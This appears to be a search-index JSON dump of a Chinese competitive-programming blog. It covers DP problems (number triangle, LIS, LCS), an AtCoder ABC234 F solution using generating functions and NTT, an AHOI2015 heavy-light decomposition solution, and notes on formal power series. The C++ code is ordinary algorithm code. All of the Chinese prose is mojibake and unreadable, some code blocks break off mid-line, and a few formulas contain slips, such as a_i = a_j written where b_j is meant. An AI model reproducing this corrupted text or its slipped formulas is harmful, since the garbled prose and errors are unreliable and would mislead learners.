å¦‚æ­¤å¯ä»¥å¯¹åŠ¨æ€è§„åˆ’åšä¸€ä¸ªæ€»ç»“ï¼š 1.æœ€ä¼˜å­ç»“æ„ï¼š$f(n)$ çš„æœ€ä¼˜è§£å¯ä»¥ç”± $f(nâˆ’2)$ å’Œ $f(nâˆ’1)$ çš„æœ€ä¼˜è§£æ¨å‡ºã€‚ 2.æ— åæ•ˆæ€§ï¼šè¦æ±‚ $f(n)$ï¼Œåªéœ€è¦æ±‚ $f(nâˆ’1)$ å’Œ $f(nâˆ’2)$ï¼Œæ— éœ€å…³å¿ƒ $f(n - 1)$ å’Œ $f(n - 2)$ æ˜¯æ€ä¹ˆå¾—åˆ°çš„ã€‚ 3.çŠ¶æ€ï¼šæ±‚è§£è¿‡ç¨‹è¿›è¡Œåˆ°äº†å“ªä¸€æ­¥ï¼Œå¯ä»¥ç†è§£ä¸ºä¸€ä¸ªå­é—®é¢˜ã€‚ 4.è½¬ç§»ï¼š$f_i = f_{i - 1} + f_{i - 2}$ ","date":"2022-01-15","objectID":"/posts/cpdp/:1:0","tags":["DP"],"title":"DP","uri":"/posts/cpdp/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"æ•°å­—ä¸‰è§’å½¢ï¼š é¢˜ç›®é“¾æ¥ ç»™å®šä¸€ä¸ªç”± $n$ è¡Œæ•°å­—ç»„æˆçš„æ•°å­—ä¸‰è§’å½¢ $a_{i, j} (j \\le i)$ï¼Œè®¡ç®—å‡ºä»ä¸‰è§’å½¢çš„é¡¶è‡³åº•çš„ä¸€æ¡è·¯å¾„ï¼Œä½¿è¯¥è·¯å¾„ç»è¿‡çš„æ•°å­—æ€»å’Œæœ€å¤§ã€‚$(1 \\le n \\le 5 \\times 10 ^2, - 10^4 \\le a_{i, j} \\le 10 ^ 4)$ çŠ¶æ€è¡¨ç¤ºï¼š$dp_{i,j}$ è¡¨ç¤ºä»èµ·ç‚¹èµ°åˆ° $(i, j)$ çš„è·¯å¾„æ€»å’Œæœ€å°å€¼ã€‚ çŠ¶æ€è½¬ç§»ï¼šåœ¨ç‚¹ $(i, j)$ å¤„åªå¯èƒ½ç”±ä¸¤ä¸ªç‚¹è½¬ç§»è¿‡æ¥ï¼Œåˆ†åˆ«æ˜¯ $(i - 1, j - 1)$ å’Œ $(i - 1, j)$ï¼Œæ‰€ä»¥è¯¥ç‚¹çš„çŠ¶æ€è½¬ç§»æ–¹ç¨‹å°±æ˜¯ $$ dp_{i,j} = \\max(dp_{i - 1, j - 1}, dp_{i - 1, j}) + a_{i, j} $$ åˆå§‹çŠ¶æ€ï¼šå› ä¸ºæˆ‘ä»¬è¦å–æœ€å¤§å€¼ï¼Œæ‰€ä»¥ä¸€å¼€å§‹æŠŠæ‰€æœ‰çŠ¶æ€æ›´æ–°ä¸º $-\\infty$ å¹¶ä¸” $(0, 0)$ ç‚¹çš„ $dp_{0, 0} = 0$ ç­”æ¡ˆï¼šæ ¹æ®çŠ¶æ€å’Œé¢˜æ„ï¼Œæˆ‘ä»¬éœ€è¦æ‰¾åˆ°åº•éƒ¨çš„ä¸€ä¸ªæœ€ä¼˜å€¼ï¼Œæ‰€ä»¥å°±éå†ä¸€éæœ€åº•éƒ¨çš„ä¸€å±‚ (æšä¸¾åˆ—)ï¼Œæ¥å¾—åˆ°ç­”æ¡ˆï¼Œå³ $$ \\max_{i = 1} ^ {n} dp_{n, i} $$ ä»£ç ï¼š #include \u003cbits/stdc++.h\u003e #define int long long using namespace std; const int N = 5e2 + 5; int n, a[N][N], dp[N][N], res = -2e9; signed main() { memset(dp, -0x3f, sizeof dp); dp[0][0] = 0; cin \u003e\u003e n; for (int i = 1; i \u003c= n; i ++) { for (int j = 1; j \u003c= i; j ++) { cin \u003e\u003e a[i][j]; } } for (int i = 1; i \u003c= n; i ++) { for (int j = 1; j \u003c= i; j ++) { dp[i][j] = max(dp[i - 1][j - 1], dp[i - 1][j]) + a[i][j]; } } for (int i = 1; i \u003c= n; i ++) res = max(res, dp[n][i]); cout \u003c\u003c res \u003c\u003c endl; } ","date":"2022-01-15","objectID":"/posts/cpdp/:2:0","tags":["DP"],"title":"DP","uri":"/posts/cpdp/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"æœ€é•¿ä¸Šå‡å­åºåˆ— é¢˜ç›®é“¾æ¥ ç»™å®šä¸€ä¸ªé•¿åº¦ä¸º $n$ çš„æ•°åˆ— $a$ï¼Œæ±‚æ•°å€¼ä¸¥æ ¼å•è°ƒé€’å¢çš„éç©ºå­åºåˆ—çš„æœ€é•¿é•¿åº¦ã€‚ $(1 \\le n \\le 10^3,-10^9 \\le a_i \\le 10 ^ 9)$ çŠ¶æ€è¡¨ç¤ºï¼š$dp_i$ è¡¨ç¤ºä»¥ $a_i$ ç»“å°¾çš„æœ€é•¿ä¸Šå‡å­åºåˆ—çš„é•¿åº¦ã€‚ çŠ¶æ€è½¬ç§»ï¼šå¯¹äºæ¯ä¸ª $a_i$ï¼Œæšä¸¾ $j \\in [1, i - 1]$ è®© $a_i$ æ¥åˆ° $a_j$ åé¢çš„æœ€ä¼˜è§£ï¼Œä¹Ÿå°±æ˜¯ $$ dp_i = \\max_{j = 1} ^{i - 1} (dp_j + 1, dp_i)[a_j \u003c a_i] $$ åˆå§‹çŠ¶æ€ï¼š$dp_{1 \\sim n} = 1$ æ¯ä¸ªæ•°éƒ½æ˜¯ä¸€ä¸ªé•¿åº¦ä¸º $1$ çš„å­åºåˆ—ã€‚ ç­”æ¡ˆï¼šæšä¸¾å¯èƒ½ä½œä¸ºæœ€é•¿ä¸Šå‡å­åºåˆ—ç»“å°¾çš„ $a_i$ï¼Œå–ä¸€éæœ€å¤§å€¼ï¼Œå³ $$ \\max_{i = 1} ^ {n} dp_i $$ ä»£ç ï¼š #include \u003cbits/stdc++.h\u003e #define int long long using namespace std; const int N = 1e3 + 5; int n, dp[N], a[N], res; signed main() { cin \u003e\u003e n; for (int i = 1; i \u003c= n; i ++) cin \u003e\u003e a[i]; for (int i = 1; i \u003c= n; i ++) { dp[i] = 1; for (int j = 1; j \u003c i; j ++) { if (a[j] \u003c a[i]) { dp[i] = max(dp[j] + 1, dp[i]); } } res = max(res, dp[i]); } cout \u003c\u003c res \u003c\u003c endl; } ","date":"2022-01-15","objectID":"/posts/cpdp/:3:0","tags":["DP"],"title":"DP","uri":"/posts/cpdp/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"æœ€é•¿å…¬å…±å­åºåˆ— é¢˜ç›®é“¾æ¥ ç»™å®šä¸¤ä¸ªé•¿åº¦åˆ†åˆ«ä¸º $n$ å’Œ $m$ çš„å­—ç¬¦ä¸² $a$ å’Œ $b$ï¼Œæ±‚æ—¢æ˜¯ $a$ çš„å­åºåˆ—åˆæ˜¯ $b$ çš„å­åºåˆ—çš„å­—ç¬¦ä¸²çš„æœ€é•¿é•¿åº¦ã€‚ $(1 \\le n,m \\le 10^3)$ çŠ¶æ€è¡¨ç¤ºï¼š$dp_{i, j}$ è¡¨ç¤º $a$ çš„å‰ $i$ ä¸ªå­—æ¯å’Œ $b$ çš„å‰ $j$ ä¸ªå­—æ¯çš„æœ€é•¿å…¬å…±å­åºåˆ—ã€‚ çŠ¶æ€è½¬ç§»ï¼šä»å°åˆ°å¤§æšä¸¾ $a, b$ æ‰€æœ‰ä¸åŒä½ç½® $i, j$ çš„æƒ…å†µï¼Œå¦‚æœ $a_i = b_j$ è¯´æ˜é‡åˆ°äº†å…¬å…±éƒ¨åˆ†ï¼Œé‚£ä¹ˆ $dp_{i, j}$ åº”è¯¥ä» $dp_{i - 1, j - 1}$ è½¬ç§»è¿‡æ¥ï¼Œå¦åˆ™ï¼Œå°±ä¸€å®šè¦èˆå¼ƒ $a_i, b_j$ ä¸­çš„ä¸€ä¸ªå­—æ¯ï¼Œå°±å–ä¸¤ç§æƒ…å†µçš„æœ€å¤§å€¼ï¼Œå³ $$ \\begin{cases} dp_{i, j} = \\max(dp_{i,j}, dp_{i - 1, j - 1} + 1) \u0026a_i = a_j \\ dp_{i, j} = \\max(dp_{i - 1, j}, dp_{i, j - 1}) \u0026a_i \\ne a_j \\end{cases} $$ åˆå§‹çŠ¶æ€ï¼šæ‰€æœ‰çŠ¶æ€åˆå§‹ä¸º $0$ ç­”æ¡ˆï¼š$a$ ä¸­å…¨éƒ¨çš„å­—æ¯å’Œ $b$ ä¸­å…¨éƒ¨çš„å­—æ¯ç»„æˆçš„æœ€é•¿ä¸Šå‡å­åºåˆ—ï¼Œå³ $dp_{n, m}$ ä»£ç ï¼š #include \u003cbits/stdc++.h\u003e #define int long long using namespace std; const int N = 1e3 + 5; int n, m, dp[N][N]; char a[N], b[N]; signed main() { cin \u003e\u003e n \u003e\u003e m \u003e\u003e a + 1 \u003e\u003e b + 1; for (int i = 1; i \u003c= n; i ++) { for (int j = 1; j \u003c= m; j ++) { if (a[i] == b[j]) { dp[i][j] = max(dp[i][j], dp[i - 1][j - 1] + 1); } else { dp[i][j] = max(dp[i - 1][j], dp[i][j - 1]); } } } cout \u003c\u003c dp[n][m] \u003c\u003c endl; } ","date":"2022-01-15","objectID":"/posts/cpdp/:4:0","tags":["DP"],"title":"DP","uri":"/posts/cpdp/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"åŸé¢˜é“¾æ¥ é¢˜æ„ ç»™å®šä¸€ä¸ªé•¿åº¦ä¸º $n$ çš„å­—ç¬¦ä¸² $S$ï¼Œè®¡ç®—æœ‰å¤šå°‘ç§éç©ºå­åºåˆ—çš„æ’åˆ—ï¼Œå¯¹ $998244353$ å–æ¨¡ã€‚ $1 \\le n \\le 5\\times 10^3$ åˆ†æï¼š è®¾ $26$ ä¸ªè‹±æ–‡å­—æ¯æ¯ä¸ªå­—æ¯ $u$ çš„ç”Ÿæˆå‡½æ•°ä¸ºï¼ˆå› ä¸ºè¦è®¡ç®—æ’åˆ—ï¼Œæ‰€ä»¥æ˜¯ $\\textbf{EGF}$ï¼‰ $$ 1 + \\frac{1}{1!}x + \\frac{1}{2!}x^2 + \\cdots + \\frac{1}{cnt_{u}!}x^{cnt_{u}} $$ å…¶ä¸­ $cnt_{u}$ ä¸ºå­—æ¯åœ¨ $S$ ä¸­å‡ºç°æ¬¡æ•°ã€‚ é‚£ä¹ˆæœ€ç»ˆæ‰€æœ‰æ–¹æ¡ˆä¸º $$ \\prod_{u = 1} ^{26}(1 + \\frac{1}{1!}x + \\frac{1}{2!}x^2 + \\cdots + \\frac{1}{cnt_{u}!}x^{cnt_{u}}) $$ è®°æ‰€æœ‰æ–¹æ¡ˆä¸º $F(x)$ï¼Œé‚£ä¹ˆè®¡ç®—å­åºåˆ—çš„æ–¹æ¡ˆæ•°å°±æ˜¯æŠŠå­—ç¬¦ä¸²é•¿åº¦ä¸º $1 \\sim n$ çš„æ‰€æœ‰æ–¹æ¡ˆä¹˜é•¿åº¦çš„é˜¶ä¹˜åŠ èµ·æ¥ï¼Œå³ $$ \\sum_{i = 1}^{n}i! \\times [x^i]F(x) $$ å› ä¸ºæœ€å¤šåªæœ‰ $26$ ä¸ªå­—æ¯ï¼Œæ‰€ä»¥ç›´æ¥æ¯æ¬¡æš´åŠ› $\\text{NTT}$ å³å¯ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥åˆ†æ²» $\\text{NTT}$ å®˜æ–¹æ ‡ç¨‹æ˜¯ $\\text{DP}$ï¼Œå¯ä»¥å‘ç°å¤šé¡¹å¼æ¯”æ ‡ç¨‹å¿«ä¸€äº›ã€‚ ","date":"2022-01-09","objectID":"/posts/cpatcoder-abc234-f-reordering/:0:0","tags":["NTT","EGF"],"title":"[AtCoder abc234 F] Reordering","uri":"/posts/cpatcoder-abc234-f-reordering/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"ä»£ç ï¼š #include \u003cbits/stdc++.h\u003e using namespace std; constexpr int mod = 998244353; using i64 = long long; int norm(int x) { if (x \u003c 0) { x += mod; } if (x \u003e= mod) { x -= mod; } return x; } template\u003cclass T\u003e T power(T a, int b) { T res = 1; for (; b; b /= 2, a *= a) { if (b % 2) { res *= a; } } return res; } struct Z { int x; Z(int x = 0) : x(norm(x)) {} int val() const { return x; } Z operator-() const { return Z(norm(mod - x)); } Z inv() const { assert(x != 0); return power(*this, mod - 2); } Z \u0026operator*=(const Z \u0026rhs) { x = i64(x) * rhs.x % mod; return *this; } Z \u0026operator+=(const Z \u0026rhs) { x = norm(x + rhs.x); return *this; } Z \u0026operator-=(const Z \u0026rhs) { x = norm(x - rhs.x); return *this; } Z \u0026operator/=(const Z \u0026rhs) { return *this *= rhs.inv(); } friend Z operator*(const Z \u0026lhs, const Z \u0026rhs) { Z res = lhs; res *= rhs; return res; } friend Z operator+(const Z \u0026lhs, const Z \u0026rhs) { Z res = lhs; res += rhs; return res; } friend Z operator-(const Z \u0026lhs, const Z \u0026rhs) { Z res = lhs; res -= rhs; return res; } friend Z operator/(const Z \u0026lhs, const Z \u0026rhs) { Z res = lhs; res /= rhs; return res; } friend istream \u0026operator\u003e\u003e(istream \u0026is, Z \u0026a) { i64 v; is \u003e\u003e v; a = Z(v); return is; } friend ostream \u0026operator\u003c\u003c(ostream \u0026os, const Z \u0026a) { return os \u003c\u003c a.val(); } }; vector\u003cint\u003e rev; vector\u003cZ\u003e roots{0, 1}; void dft(vector\u003cZ\u003e \u0026a) { int n = a.size(); if (int(rev.size()) != n) { int k = __builtin_ctz(n) - 1; rev.resize(n); for (int i = 0; i \u003c n; i ++) { rev[i] = rev[i \u003e\u003e 1] \u003e\u003e 1 | (i \u0026 1) \u003c\u003c k; } } for (int i = 0; i \u003c n; i ++) { if (rev[i] \u003c i) { swap(a[i], a[rev[i]]); } } if (int(roots.size()) \u003c n) { int k = __builtin_ctz(roots.size()); roots.resize(n); while ((1 \u003c\u003c k) \u003c n) { Z e = power(Z(3), (mod - 1) \u003e\u003e (k + 1)); for (int i = 1 \u003c\u003c (k - 1); i \u003c (1 \u003c\u003c k); i ++) { roots[i \u003c\u003c 1] = roots[i]; roots[i \u003c\u003c 1 | 1] = roots[i] * e; } k ++; } } for (int k = 1; k \u003c n; k *= 2) { for (int i = 0; i \u003c n; i += 2 * k) { for (int j = 0; j \u003c k; j ++) { Z u = a[i + j], v = a[i + j + k] * roots[k + j]; a[i + j] = u + v, a[i + j + k] = u - v; } } } } void idft(vector\u003cZ\u003e \u0026a) { int n = a.size(); reverse(a.begin() + 1, a.end()); dft(a); Z inv = (1 - mod) / n; for (int i = 0; i \u003c n; i ++) { a[i] *= inv; } } struct Poly { vector\u003cZ\u003e a; Poly() {} Poly(const vector\u003cZ\u003e \u0026a) : a(a) {} Poly(const initializer_list\u003cZ\u003e \u0026a) : a(a) {} int size() const { return a.size(); } void resize(int n) { a.resize(n); } Z operator[](int idx) const { if (idx \u003c size()) { return a[idx]; } else { return 0; } } Z \u0026operator[](int idx) { return a[idx]; } Poly mulxk(int k) const { auto b = a; b.insert(b.begin(), k, 0); return Poly(b); } Poly modxk(int k) const { k = min(k, size()); return Poly(vector\u003cZ\u003e(a.begin(), a.begin() + k)); } Poly divxk(int k) const { if (size() \u003c= k) { return Poly(); } return Poly(vector\u003cZ\u003e(a.begin() + k, a.end())); } friend Poly operator+(const Poly \u0026a, const Poly \u0026b) { vector\u003cZ\u003e res(max(a.size(), b.size())); for (int i = 0; i \u003c int(res.size()); i ++) { res[i] = a[i] + b[i]; } return Poly(res); } friend Poly operator-(const Poly \u0026a, const Poly \u0026b) { vector\u003cZ\u003e res(max(a.size(), b.size())); for (int i = 0; i \u003c int(res.size()); i ++) { res[i] = a[i] - b[i]; } return Poly(res); } friend Poly operator*(Poly a, Poly b) { if (a.size() == 0 || b.size() == 0) { return Poly(); } int sz = 1, tot = a.size() + b.size() - 1; while (sz \u003c tot) { sz *= 2; } a.a.resize(sz); b.a.resize(sz); dft(a.a); dft(b.a); for (int i = 0; i \u003c sz; i ++) { a.a[i] = a[i] * b[i]; } idft(a.a); a.resize(tot); return a; } friend Poly operator*(Z a, Poly b) { for (int i = 0; i \u003c int(b.size()); i ++) { b[i] *= a; } return b; } friend Poly operator*(Poly a, Z b) { for (int i = 0; i \u003c int(a.size()); i ++) { a[i] *= b; } return a; } Poly \u0026operator+=(Poly b) { return (*this) = (*this) + b; } Poly \u0026operator-=(Poly b) { return (*this) = (*this) - b; } Poly \u0026operator*=(Poly b) { return (*this) = (*this) * b; } Poly deriv() const { if (a.empty()) { return Poly(); } vector\u003cZ\u003e res(size() - 1); for (int i = 0; i \u003c size","date":"2022-01-09","objectID":"/posts/cpatcoder-abc234-f-reordering/:1:0","tags":["NTT","EGF"],"title":"[AtCoder abc234 F] Reordering","uri":"/posts/cpatcoder-abc234-f-reordering/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"åŸé¢˜é“¾æ¥ é¢˜æ„ ç»™å®šä¸€ä¸ª $n$ ä¸ªç‚¹ $m$ æ¡è¾¹çš„å›¾ï¼Œæœ‰ä¸è¶…è¿‡ $40000$ æ¬¡çš„æ“ä½œï¼Œæ¯æ¬¡æ“ä½œæœ‰ä¸‰ä¸ªå‚æ•° $op, u, v$ è‹¥ $op =0$ ï¼Œè¡¨ç¤ºåˆ é™¤ç‚¹ $u,v$ ä¹‹é—´çš„è¾¹ è‹¥ $op = 1$ï¼Œè¡¨ç¤ºè¯¢é—® $u, v$ ä¹‹é—´æœ‰å¤šå°‘å…³é”®è¾¹ å…³é”®è¾¹ï¼š $u, v$ è”é€šï¼Œè‹¥åˆ é™¤è¯¥è¾¹ $u, v$ ä¸è¿é€šï¼Œåˆ™ä¸ºå…³é”®è¾¹ åˆ†æï¼š æœ€æœ´ç´ çš„æƒ³æ³•æ˜¯æ¯æ¬¡åˆ å®Œè¾¹ä¹‹å $\\text{tarjan}$ ç¼©ç‚¹ï¼Œå†ç»´æŠ¤æ ‘ä¸Šä¸¤ç‚¹è·ç¦»ï¼Œä½†è¿™æ ·æ˜¾ç„¶ä¼šè¶…æ—¶ã€‚ æ‰€ä»¥è€ƒè™‘é€†åºç¦»çº¿å¤„ç†ã€‚ æˆ‘ä»¬å‘ç°å¦‚æœæ˜¯ä¸€æ£µæ ‘ï¼Œé‚£ä¹ˆæ‰€æœ‰çš„è¾¹éƒ½æ˜¯å…³é”®è¾¹ï¼Œ$u, v$ ä¸¤ç‚¹çš„å…³é”®è¾¹æ•°é‡å°±ç­‰äº $u, v$ æ ‘ä¸Šä¸¤ç‚¹è·ç¦»ã€‚å¹¶ä¸”åœ¨æ ‘ä¸Šä»»æ„ä¸¤ç‚¹åŠ ä¸€æ¡è¾¹éƒ½ä¼šå½¢æˆä¸€ä¸ªç¯ï¼Œç¯å†…æ‰€æœ‰çš„è¾¹éƒ½ä¸å¯èƒ½æˆä¸ºå…³é”®è¾¹ï¼Œæ‰€ä»¥æ­¤æ—¶åªéœ€è¦å°†è¿™ä¸¤ç‚¹è·¯å¾„ä¸Šçš„æ¯ä¸€æ¡è¾¹çš„æƒå€¼éƒ½å˜ä¸º $0$ ï¼Œè¿™ä¸ªæ“ä½œå¯ä»¥ç”¨æ ‘é“¾å‰–åˆ†çº¿æ®µæ ‘ç»´æŠ¤ã€‚ å…ˆåœ¨å›¾ä¸­éšæ„æ‰¾ä¸€é¢—ç”Ÿæˆæ ‘ï¼Œå¯ä»¥ç”¨å¹¶æŸ¥é›†ç»´æŠ¤ï¼ŒæŠŠè¿™äº›æ ‘è¾¹æ ‡è®°ä¸€ä¸‹ï¼Œé‚£ä¹ˆå…¶ä»–æœªæ ‡è®°çš„è¾¹å°±æ˜¯è¦æˆç¯çš„è¾¹ï¼Œä¹Ÿå°±æ˜¯è¦è¿›è¡Œè·¯å¾„ä¸Šèµ‹å€¼ä¸º $0$ çš„ç‚¹å¯¹ã€‚ ä¹‹åè¯»å…¥æ“ä½œï¼ŒæŠŠè¦åˆ é™¤çš„è¾¹ä»¥ç‚¹å¯¹çš„å½¢å¼ç”¨ $\\text{STL map}$ ç»´æŠ¤ï¼Œè¿™äº›ç‚¹å¯¹ç›¸å½“äºè¦†ç›–ä¸€å¼€å§‹è¦è¿›è¡Œè·¯å¾„ä¸Šèµ‹å€¼ä¸º $0$ çš„ç‚¹å¯¹ï¼Œæœ€åé€†åºåœ°å¤„ç†è¯¢é—®ï¼Œé€†åºè¾“å‡ºç»“æœå³å¯ã€‚ ","date":"2021-12-10","objectID":"/posts/cpahoi2015-%E8%88%AA%E7%BA%BF%E8%A7%84%E5%88%92/:0:0","tags":["ç¦»çº¿","æ ‘é“¾å‰–åˆ†"],"title":"[AHOI2015] èˆªçº¿è§„åˆ’","uri":"/posts/cpahoi2015-%E8%88%AA%E7%BA%BF%E8%A7%84%E5%88%92/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"ä»£ç ï¼š #include \u003cbits/stdc++.h\u003e #define int long long #define x first #define y second #define PII pair\u003cint, int\u003e using namespace std; const int N = 1e5 + 5, M = N \u003c\u003c 1; int n, m, u[N], v[N], op, cnt, h[N], e[M], ne[M], idx, Size[N], top[N], dep[N], fa[N], son[N], id[N], Cnt, p[N]; bool st[N]; map\u003cPII, int\u003e mp; vector\u003cint\u003e ans; struct Query { int op, u, v; } q[N]; struct SegmentTree { int l, r, add, sum; } tr[N \u003c\u003c 2]; int find(int x) { return p[x] == x ? p[x] : p[x] = find(p[x]); } void add(int a, int b) { e[idx] = b, ne[idx] = h[a], h[a] = idx ++; } void dfs1(int u, int father, int depth) { dep[u] = depth, fa[u] = father, Size[u] = 1; for (int i = h[u]; ~i; i = ne[i]) { int j = e[i]; if (j == father) continue; dfs1(j, u, depth + 1); Size[u] += Size[j]; if (Size[son[u]] \u003c Size[j]) son[u] = j; } } void dfs2(int u, int t) { id[u] = ++ Cnt, top[u] = t; if (!son[u]) return ; dfs2(son[u], t); for (int i = h[u]; ~i; i = ne[i]) { int j = e[i]; if (j == fa[u] || j == son[u]) continue; dfs2(j, j); } } void pushup(int u) { tr[u].sum = tr[u \u003c\u003c 1].sum + tr[u \u003c\u003c 1 | 1].sum; } void pushdown(int u) { if (tr[u].add != -1) { tr[u \u003c\u003c 1].add = tr[u \u003c\u003c 1 | 1].add = tr[u].add; tr[u \u003c\u003c 1].sum = (tr[u \u003c\u003c 1].r - tr[u \u003c\u003c 1].l + 1) * tr[u].add; tr[u \u003c\u003c 1 | 1].sum = (tr[u \u003c\u003c 1 | 1].r - tr[u \u003c\u003c 1 | 1].l + 1) * tr[u].add; tr[u].add = -1; } } void build(int u, int l, int r) { if (l == r) { tr[u] = {l, r, -1, 1}; } else { tr[u] = {l, r, -1}; int mid = l + r \u003e\u003e 1; build(u \u003c\u003c 1, l, mid), build(u \u003c\u003c 1 | 1, mid + 1, r); pushup(u); } } void modify(int u, int l, int r, int c) { if (tr[u].l \u003e= l \u0026\u0026 tr[u].r \u003c= r) { tr[u].add = c; tr[u].sum = (tr[u].r - tr[u].l + 1) * c; return ; } pushdown(u); int mid = tr[u].l + tr[u].r \u003e\u003e 1; if (l \u003c= mid) modify(u \u003c\u003c 1, l, r, c); if (r \u003e mid) modify(u \u003c\u003c 1 | 1, l, r, c); pushup(u); } int ask(int u, int l, int r) { if (tr[u].l \u003e= l \u0026\u0026 tr[u].r \u003c= r) return tr[u].sum; pushdown(u); int mid = tr[u].l + tr[u].r \u003e\u003e 1, res = 0; if (l \u003c= mid) res += ask(u \u003c\u003c 1, l, r); if (r \u003e mid) res += ask(u \u003c\u003c 1 | 1, l, r); return res; } void modify_path(int u, int v, int k) { while (top[u] != top[v]) { if (dep[top[u]] \u003c dep[top[v]]) swap(u, v); modify(1, id[top[u]], id[u], k); u = fa[top[u]]; } if (dep[u] \u003c dep[v]) swap(u, v); modify(1, id[v] + 1, id[u], k); } int ask_path(int u, int v) { int res = 0; while (top[u] != top[v]) { if (dep[top[u]] \u003c dep[top[v]]) swap(u, v); res += ask(1, id[top[u]], id[u]); u = fa[top[u]]; } if (dep[u] \u003c dep[v]) swap(u, v); res += ask(1, id[v] + 1, id[u]); return res; } signed main() { memset(h, -1, sizeof h); cin \u003e\u003e n \u003e\u003e m; for (int i = 1; i \u003c= n; i ++) p[i] = i; for (int i = 1; i \u003c= m; i ++) cin \u003e\u003e u[i] \u003e\u003e v[i]; for (int i = 1; i \u003c= m; i ++) { int pu = find(u[i]), pv = find(v[i]); if (pu != pv) { p[pu] = pv; add(u[i], v[i]), add(v[i], u[i]); st[i] = 1; } } dfs1(1, -1, 1), dfs2(1, 1); build(1, 1, n); while (1) { cin \u003e\u003e op; if (op == -1) break; cnt ++; q[cnt].op = op; cin \u003e\u003e q[cnt].u \u003e\u003e q[cnt].v; } for (int i = 1; i \u003c= cnt; i ++) { if (!q[i].op) { mp[{q[i].u, q[i].v}] = mp[{q[i].v, q[i].u}] = 1; } } for (int i = 1; i \u003c= m; i ++) { if (!st[i] \u0026\u0026 !mp[{u[i], v[i]}]) { modify_path(u[i], v[i], 0); } } for (int i = cnt; i; i --) { if (!q[i].op) { modify_path(q[i].u, q[i].v, 0); } else if (q[i].op == 1) { ans.push_back(ask_path(q[i].u, q[i].v)); } } for (int i = ans.size() - 1; ~i; i --) cout \u003c\u003c ans[i] \u003c\u003c endl; } ","date":"2021-12-10","objectID":"/posts/cpahoi2015-%E8%88%AA%E7%BA%BF%E8%A7%84%E5%88%92/:1:0","tags":["ç¦»çº¿","æ ‘é“¾å‰–åˆ†"],"title":"[AHOI2015] èˆªçº¿è§„åˆ’","uri":"/posts/cpahoi2015-%E8%88%AA%E7%BA%BF%E8%A7%84%E5%88%92/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"å½¢å¼å¹‚çº§æ•° è®¾æ•°åˆ— $a_0,a_1, a_2,\\cdots,a_n,\\cdots$ é‚£ä¹ˆä»–çš„å½¢å¼å¹‚çº§æ•°å°±ä¸º $$\\sum_{i = 0}^{\\infty}a_ix^i$$ è¿ç®—ï¼š è®¾ $f(x) = \\sum_{i = 0}^{\\infty}a_ix^i,g(x) = \\sum_{i = 0}^{\\infty}b_ix^i$ åŠ æ³•ï¼š $$f(x) + g(x) = \\sum_{i = 0}^{\\infty}(a_i + b_i)x^i$$ å‡æ³•ï¼š $$f(x) - g(x) = \\sum_{i = 0}^{\\infty}(a_i - b_i)x^i$$ ä¹˜æ³•ï¼š $$f(x) * g(x) = \\sum_{i = 0}^{\\infty}\\sum_{k = 0}^{i}a_k * b_{i - k}x^i$$ è®°å·ï¼š è®°å½¢å¼å¹‚çº§æ•° $f(x)$ çš„ $x^n$ é¡¹ç³»æ•°ä¸º $[x^n] f(x)$ ","date":"2021-12-06","objectID":"/posts/cp%E7%94%9F%E6%88%90%E5%87%BD%E6%95%B0/:1:0","tags":["ç”Ÿæˆå‡½æ•°"],"title":"ç”Ÿæˆå‡½æ•°","uri":"/posts/cp%E7%94%9F%E6%88%90%E5%87%BD%E6%95%B0/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"å¸¸ç”Ÿæˆå‡½æ•° ","date":"2021-12-06","objectID":"/posts/cp%E7%94%9F%E6%88%90%E5%87%BD%E6%95%B0/:2:0","tags":["ç”Ÿæˆå‡½æ•°"],"title":"ç”Ÿæˆå‡½æ•°","uri":"/posts/cp%E7%94%9F%E6%88%90%E5%87%BD%E6%95%B0/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"å®šç†ï¼š è®¾ $S = {a_1,a_2,\\cdots,a_k}$ ï¼Œä¸” $a_i$ å¯ä»¥å–çš„æ¬¡æ•°çš„é›†åˆä¸º $M_i$ ï¼Œè®° $F_i(x) = \\sum_{u \\in M_i}x^u$ ï¼Œåˆ™ä» $S$ ä¸­å– $n$ ä¸ªå…ƒç´ ç»„æˆé›†åˆçš„æ–¹æ¡ˆæ•° $g(n)$ çš„å¸¸ç”Ÿæˆå‡½æ•° $G(x) = \\sum_{i =0}^{\\infty}g(i)x^i$ æ»¡è¶³ï¼š $$G(x) = F_1(x)F_2(x) \\cdots F_k(x)$$ ","date":"2021-12-06","objectID":"/posts/cp%E7%94%9F%E6%88%90%E5%87%BD%E6%95%B0/:2:1","tags":["ç”Ÿæˆå‡½æ•°"],"title":"ç”Ÿæˆå‡½æ•°","uri":"/posts/cp%E7%94%9F%E6%88%90%E5%87%BD%E6%95%B0/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"å½¢å¼å¹‚çº§æ•°çš„é€†å…ƒï¼š $A(x)B(x) = 1$ é€†å…ƒå­˜åœ¨çš„æ¡ä»¶ï¼š$[x^0]A(x) \\ne 0$ æš´åŠ›è®¡ç®—çš„æ–¹æ³•ï¼šé€’æ¨ å¸¸è§çš„é€†ï¼š $$\\sum_{i = 0}^{\\infty}x^i = \\frac{1}{1 - x}$$ $$\\sum_{i = 0}^{\\infty} a^ix^i = \\frac{1}{1 - ax}$$ $$\\sum_{ i = 0}^{\\infty}\\binom{i + k - 1}{i}x^i=\\frac{1}{(1 - x)^k}$$ ","date":"2021-12-06","objectID":"/posts/cp%E7%94%9F%E6%88%90%E5%87%BD%E6%95%B0/:2:2","tags":["ç”Ÿæˆå‡½æ•°"],"title":"ç”Ÿæˆå‡½æ•°","uri":"/posts/cp%E7%94%9F%E6%88%90%E5%87%BD%E6%95%B0/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"ä¾‹é¢˜ï¼š é£Ÿç‰© åœ¨ä¸€ä¸ªè‡ªåŠ©æ°´æœåº—ï¼Œæœ‰è‹¹æœã€é¦™è•‰ã€è‰è“ä¸‰ç§æ°´æœï¼Œä½ å¯ä»¥å– $n$ 